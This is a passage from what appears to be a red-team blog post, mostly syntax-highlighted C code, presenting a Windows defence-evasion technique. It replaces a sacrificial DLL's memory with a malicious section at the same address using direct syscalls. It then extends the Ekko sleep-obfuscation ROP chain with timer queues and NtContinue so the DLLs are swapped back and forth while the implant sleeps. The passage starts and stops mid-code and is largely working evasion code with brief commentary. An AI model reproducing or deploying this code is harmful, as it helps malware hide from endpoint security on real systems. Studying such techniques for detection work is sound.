                            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>handle<span class="token punctuation">.</span>Handle<span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>

                    <span class="token punctuation">}</span>
                    <span class="token comment">// i haven't found any match</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">ZwFreeVirtualMemory</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token punctuation">(</span>LONG_PTR<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buffermeminfo<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwFreeVirtualMemoryF<span class="token punctuation">]</span><span class="token punctuation">.</span>SSN<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwFreeVirtualMemoryF<span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">ZwUnmapViewOfSection</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token punctuation">(</span>LONG_PTR<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> viewBase<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwUnmapViewOfSectionF<span class="token punctuation">]</span><span class="token punctuation">.</span>SSN<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwUnmapViewOfSectionF<span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                        <span class="token comment">// MB(NULL, msg, msg, MB_OK | MB_ICONINFORMATION);//1</span>
                        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><span>C</span></div></div></div></div><p>Sorry, haven‚Äôt kept my promise of clean and short. These lines above to enumerate kernel objects till I find the one that belongs to the DLL I loaded.</p><h3 id="little-swap">Little Swap!</h3><p>Here I unload the sacrificial DLL and load the nasty one at the same address:</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-c"><code class=" language-c" data-lang="c">HANDLE <span class="token function">SwapDll</span><span class="token punctuation">(</span>SIZE_T MODULESIZE<span class="token punctuation">,</span> PVOID SACDLLBASE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    
    HANDLE malHandle <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    NTSTATUS STATUS <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
    LARGE_INTEGER sectionSize <span class="token operator">=</span> <span class="token punctuation">{</span> MODULESIZE <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment">//createsection</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">ZwCreateSection</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>malHandle<span class="token punctuation">,</span> SECTION_ALL_ACCESS<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sectionSize<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> SEC_COMMIT<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwCreateSectionF<span class="token punctuation">]</span><span class="token punctuation">.</span>SSN<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwCreateSectionF<span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">//unamep the sacrificial DLL </span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">ZwUnmapViewOfSection</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token punctuation">(</span>LONG_PTR<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> SACDLLBASE<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwUnmapViewOfSectionF<span class="token punctuation">]</span><span class="token punctuation">.</span>SSN<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwUnmapViewOfSectionF<span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>
    
    <span class="token comment">//mapviewofsection of the malicious section at the same address as the sacdll</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">ZwMapViewOfSection</span><span class="token punctuation">(</span>malHandle<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token punctuation">(</span>LONG_PTR<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>SACDLLBASE<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>MODULESIZE<span class="token punctuation">,</span> ViewUnmap<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwMapViewOfSectionF<span class="token punctuation">]</span><span class="token punctuation">.</span>SSN<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwMapViewOfSectionF<span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> malHandle<span class="token punctuation">;</span>

<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><span>C</span></div></div></div></div><p>once this code is executed the malicious unbacked section with be ready to hold some IOC at the same address the sacrificial DLL was loaded previously.</p><h3 id="buonanotte-and-its-already-ekkoqua">BuonaNotte and it‚Äôs already EkkoQua</h3><p>In this part I take the famous Ekko and I do some shenanigans to include in the ROP chain also functions that take more than four arguments (as we know the Windows calling convention wants the 5th onwards arguments to be passed to the function onto the stack). Why do I do this? Well, if the game here is to unmap/map DLLs, I got to use functions like <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffileex">MapViewOfFileEx</a>.</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-c"><code class=" language-c" data-lang="c">VOID <span class="token function">EkkoQua</span><span class="token punctuation">(</span>PVOID ImageBaseDLL<span class="token punctuation">,</span> HANDLE sacDllHandle<span class="token punctuation">,</span> HANDLE malDllHandle<span class="token punctuation">,</span> SIZE_T viewSize<span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token comment">//we have two stack, one bello one brutto</span>
    PDWORD64 newStack <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    PDWORD64 newStackMal <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    
    CONTEXT<span class="token operator">*</span> CtxThread <span class="token operator">=</span> <span class="token punctuation">(</span>CONTEXT<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CONTEXT<span class="token punctuation">)</span><span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    CONTEXT<span class="token operator">*</span> RopUnmapMal <span class="token operator">=</span> <span class="token punctuation">(</span>CONTEXT<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CONTEXT<span class="token punctuation">)</span><span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    CONTEXT<span class="token operator">*</span> RopMapSac <span class="token operator">=</span> <span class="token punctuation">(</span>CONTEXT<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CONTEXT<span class="token punctuation">)</span><span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    CONTEXT<span class="token operator">*</span> RopDelay <span class="token operator">=</span> <span class="token punctuation">(</span>CONTEXT<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CONTEXT<span class="token punctuation">)</span><span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    CONTEXT<span class="token operator">*</span> RopMapMal <span class="token operator">=</span> <span class="token punctuation">(</span>CONTEXT<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CONTEXT<span class="token punctuation">)</span><span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    CONTEXT<span class="token operator">*</span> RopUnmapSac <span class="token operator">=</span> <span class="token punctuation">(</span>CONTEXT<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CONTEXT<span class="token punctuation">)</span><span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    CONTEXT<span class="token operator">*</span> RopSetEvt <span class="token operator">=</span> <span class="token punctuation">(</span>CONTEXT<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CONTEXT<span class="token punctuation">)</span><span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    HANDLE  hTimerQueue <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    HANDLE  hNewTimer <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    HANDLE  hEvent <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    PVOID   ImageBase <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    DWORD   ImageSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    DWORD   HeadersSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    DWORD   OldProtect <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    PVOID   NtContinue <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    PVOID   SysFunc032 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    PVOID   RtlMoveMemory <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    PVOID zwMapViewOfSection <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    hEvent <span class="token operator">=</span> <span class="token function">CreateEventW</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    hTimerQueue <span class="token operator">=</span> <span class="token function">CreateTimerQueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    NtContinue <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"Ntdll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"NtContinue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">CreateTimerQueueTimer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hNewTimer<span class="token punctuation">,</span> hTimerQueue<span class="token punctuation">,</span> <span class="token punctuation">(</span>WAITORTIMERCALLBACK<span class="token punctuation">)</span>RtlCaptureContext<span class="token punctuation">,</span> CtxThread<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> WT_EXECUTEINTIMERTHREAD<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//create timer </span>
    <span class="token punctuation">{</span>
        <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>hEvent<span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token comment">//querying the memory basing on the RSP</span>
        MEMORY_BASIC_INFORMATION mbi<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">VirtualQuery</span><span class="token punctuation">(</span><span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span>CtxThread<span class="token operator">-&gt;</span>Rsp<span class="token punctuation">,</span> <span class="token operator">&amp;</span>mbi<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>mbi<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">//allocating memory basing on the region size to hold the copy of the stack</span>
        newStack <span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD64<span class="token punctuation">)</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> mbi<span class="token punctuation">.</span>RegionSize<span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
        newStackMal <span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD64<span class="token punctuation">)</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> mbi<span class="token punctuation">.</span>RegionSize<span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//copy the stack in the new memory location</span>
        <span class="token function">memcpy</span><span class="token punctuation">(</span>newStack<span class="token punctuation">,</span> mbi<span class="token punctuation">.</span>BaseAddress<span class="token punctuation">,</span> mbi<span class="token punctuation">.</span>RegionSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">memcpy</span><span class="token punctuation">(</span>newStackMal<span class="token punctuation">,</span> mbi<span class="token punctuation">.</span>BaseAddress<span class="token punctuation">,</span> mbi<span class="token punctuation">.</span>RegionSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//finding the delta between the start of the region and RSP</span>
        SIZE_T delta <span class="token operator">=</span> <span class="token punctuation">(</span>CtxThread<span class="token operator">-&gt;</span>Rsp <span class="token operator">-</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>mbi<span class="token punctuation">.</span>BaseAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
       
        <span class="token keyword">if</span> <span class="token punctuation">(</span>CtxThread <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> RopUnmapMal <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> RopMapSac <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> RopDelay <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> RopMapMal <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> RopUnmapSac <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> RopSetEvt <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">memcpy</span><span class="token punctuation">(</span>RopUnmapMal<span class="token punctuation">,</span> CtxThread<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CONTEXT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">memcpy</span><span class="token punctuation">(</span>RopMapSac<span class="token punctuation">,</span> CtxThread<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CONTEXT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">memcpy</span><span class="token punctuation">(</span>RopDelay<span class="token punctuation">,</span> CtxThread<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CONTEXT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">memcpy</span><span class="token punctuation">(</span>RopMapMal<span class="token punctuation">,</span> CtxThread<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CONTEXT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">memcpy</span><span class="token punctuation">(</span>RopUnmapSac<span class="token punctuation">,</span> CtxThread<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CONTEXT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">memcpy</span><span class="token punctuation">(</span>RopSetEvt<span class="token punctuation">,</span> CtxThread<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CONTEXT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">(</span><span class="token operator">*</span>RopUnmapMal<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp <span class="token operator">-=</span> <span class="token number">8</span><span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token operator">*</span>RopUnmapMal<span class="token punctuation">)</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>UnmapViewOfFile<span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token operator">*</span>RopUnmapMal<span class="token punctuation">)</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span>ImageBaseDLL<span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token comment">//setting RSP to the new RSP</span>
        <span class="token punctuation">(</span><span class="token operator">*</span>RopMapSac<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>newStack <span class="token operator">+</span> delta<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token operator">*</span>RopMapSac<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp <span class="token operator">-=</span> <span class="token number">8</span><span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token operator">*</span>RopMapSac<span class="token punctuation">)</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>MapViewOfFileEx<span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token operator">*</span>RopMapSac<span class="token punctuation">)</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>sacDllHandle<span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token operator">*</span>RopMapSac<span class="token punctuation">)</span><span class="token punctuation">.</span>Rdx <span class="token operator">=</span> FILE_MAP_ALL_ACCESS<span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token operator">*</span>RopMapSac<span class="token punctuation">)</span><span class="token punctuation">.</span>R8 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token number">0x00</span><span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token operator">*</span>RopMapSac<span class="token punctuation">)</span><span class="token punctuation">.</span>R9 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token number">0x00</span><span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PDWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>RopMapSac<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> viewSize<span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PDWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>RopMapSac<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ULONGLONG<span class="token punctuation">)</span><span class="token punctuation">(</span>ImageBaseDLL<span class="token punctuation">)</span><span class="token punctuation">;</span>

        
        <span class="token punctuation">(</span><span class="token operator">*</span>RopDelay<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp <span class="token operator">-=</span> <span class="token number">8</span><span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token operator">*</span>RopDelay<span class="token punctuation">)</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>WaitForSingleObject<span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token operator">*</span>RopDelay<span class="token punctuation">)</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token punctuation">(</span>LONG_PTR<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token operator">*</span>RopDelay<span class="token punctuation">)</span><span class="token punctuation">.</span>Rdx <span class="token operator">=</span> <span class="token number">0x1388</span><span class="token punctuation">;</span> 

        <span class="token punctuation">(</span><span class="token operator">*</span>RopUnmapSac<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp <span class="token operator">-=</span> <span class="token number">8</span><span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token operator">*</span>RopUnmapSac<span class="token punctuation">)</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>UnmapViewOfFile<span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token operator">*</span>RopUnmapSac<span class="token punctuation">)</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span>ImageBaseDLL<span class="token punctuation">)</span><span class="token punctuation">;</span>

       
        <span class="token punctuation">(</span><span class="token operator">*</span>RopMapMal<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>newStackMal <span class="token operator">+</span> delta<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token operator">*</span>RopMapMal<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp <span class="token operator">-=</span> <span class="token number">8</span><span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token operator">*</span>RopMapMal<span class="token punctuation">)</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>MapViewOfFileEx<span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token operator">*</span>RopMapMal<span class="token punctuation">)</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>malDllHandle<span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token operator">*</span>RopMapMal<span class="token punctuation">)</span><span class="token punctuation">.</span>Rdx <span class="token operator">=</span> FILE_MAP_ALL_ACCESS <span class="token operator">|</span> FILE_MAP_EXECUTE<span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token operator">*</span>RopMapMal<span class="token punctuation">)</span><span class="token punctuation">.</span>R8 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token number">0x00</span><span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token operator">*</span>RopMapMal<span class="token punctuation">)</span><span class="token punctuation">.</span>R9 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token number">0x00</span><span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>RopMapMal<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span> 
        <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>RopMapMal<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>ImageBaseDLL<span class="token punctuation">;</span>
        
        <span class="token punctuation">(</span><span class="token operator">*</span>RopSetEvt<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp <span class="token operator">-=</span> <span class="token number">8</span><span class="token punctuation">;</span>
